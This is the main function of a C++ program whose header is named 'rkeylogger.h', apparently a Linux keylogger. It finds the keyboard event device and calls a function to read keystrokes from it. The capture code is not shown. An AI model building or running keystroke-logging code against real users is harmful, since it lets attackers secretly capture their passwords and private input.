#include "rkeylogger.h"
#include <iostream>

int main() {
    const char* devnode = guess_input_file();
    if(devnode == nullptr){
        std::cerr << "[ ERROR ]: Cannot use libudev.h" << std::endl;
        return EXIT_FAILURE;
    }
    
    std::cout << "[ LOG ]: Use the following keyboard event path: " << devnode << "\b";

    if(!read_input_file(devnode)){
        std::cout << "[ ERROR ]: Cannot open the file (probably a permission problem)" << std::endl;
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}